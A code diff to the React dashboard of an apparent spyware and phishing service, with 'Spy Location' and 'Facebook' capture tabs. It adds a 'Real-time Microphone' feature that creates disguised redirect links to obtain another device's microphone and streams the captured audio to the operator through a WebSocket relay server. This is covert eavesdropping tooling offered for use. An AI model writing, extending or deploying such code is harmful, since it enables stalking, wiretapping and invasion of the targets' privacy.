@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import Header from './Header';
 import LinkGenerator from './LinkGenerator';
 import LinksList from './LinksList';
@@ -59,6 +59,93 @@ function FacebookCaptures() {
   );
 }
 
+function MicrophonePlaceholder() {
+  const [links, setLinks] = useState([]);
+  const [listeningId, setListeningId] = useState(null);
+  const audioRef = useRef(null);
+
+  // Substitua pela URL do seu backend WebSocket relay
+  const WS_URL = 'wss://mic-relay-server.onrender.com';
+
+  function gerarLink() {
+    const id = Math.random().toString(36).substring(2, 10);
+    setLinks(l => [{ id, url: 'https://redirect-online.vercel.app/microphone/' + id }, ...l]);
+  }
+
+  function listen(id) {
+    setListeningId(id);
+    if (audioRef.current) audioRef.current.srcObject = null;
+    const ws = new window.WebSocket(WS_URL);
+    const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+    let audioBuffer = [];
+    ws.onopen = () => {
+      ws.send(JSON.stringify({ listen: id }));
+    };
+    ws.onmessage = e => {
+      const msg = JSON.parse(e.data);
+      if (msg.id === id && msg.audio) {
+        const floatArray = new Float32Array(msg.audio);
+        const buffer = audioContext.createBuffer(1, floatArray.length, 44100);
+        buffer.copyToChannel(floatArray, 0);
+        const source = audioContext.createBufferSource();
+        source.buffer = buffer;
+        source.connect(audioContext.destination);
+        source.start();
+      }
+    };
+  }
+
+  return (
+    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
+      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Real-time Microphone</h3>
+      <p style={{ color: 'var(--cinza-conspiracao)' }}>Generate a link to request real-time microphone access from another device.</p>
+      <button onClick={gerarLink} style={{
+        background: 'var(--vermelho-paixao)',
+        color: 'var(--branco-confissao)',
+        borderRadius: 8,
+        padding: '0.75rem 2rem',
+        fontFamily: 'Montserrat',
+        fontWeight: 'bold',
+        fontSize: '1.1rem',
+        border: 'none',
+        cursor: 'pointer',
+        transition: 'background 0.2s',
+        marginTop: 8
+      }}>Generate Microphone Link</button>
+      {links.length > 0 && (
+        <div style={{ marginTop: 20 }}>
+          {links.map(link => (
+            <div key={link.id} style={{
+              background: 'var(--fundo-destaque)',
+              borderRadius: 10,
+              margin: '1rem 0',
+              padding: '1rem',
+              boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
+            }}>
+              <div style={{ marginBottom: 8 }}>
+                <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
+              </div>
+              <button onClick={() => listen(link.id)} style={{
+                background: 'var(--ouro-tentacao)',
+                color: 'var(--preto-espionagem)',
+                borderRadius: 8,
+                padding: '0.5rem 1.5rem',
+                fontFamily: 'Montserrat',
+                fontWeight: 'bold',
+                fontSize: '1rem',
+                border: 'none',
+                cursor: 'pointer',
+                marginTop: 10
+              }}>Listen in real time</button>
+            </div>
+          ))}
+        </div>
+      )}
+      <audio ref={audioRef} autoPlay style={{ display: 'none' }} />
+    </div>
+  );
+}
+
 export default function Dashboard({ email }) {
   const [active, setActive] = useState('Spy Location');
 
@@ -84,7 +171,8 @@ export default function Dashboard({ email }) {
           <p style={{ textAlign: 'center', color: 'var(--cinza-conspiracao)', marginBottom: 32 }}>Welcome, <b>{email}</b>!</p>
           {active === 'Spy Location' && <><LinkGenerator /><LinksList /></>}
           {active === 'Facebook' && <><LinkGenerator onlyFacebook /><FacebookCaptures /></>}
-          {active !== 'Spy Location' && active !== 'Facebook' && (
+          {active === 'Real-time Microphone' && <MicrophonePlaceholder />}
+          {active !== 'Spy Location' && active !== 'Facebook' && active !== 'Real-time Microphone' && (
             <div style={{
               background: 'var(--fundo-destaque)',
               borderRadius: 16,
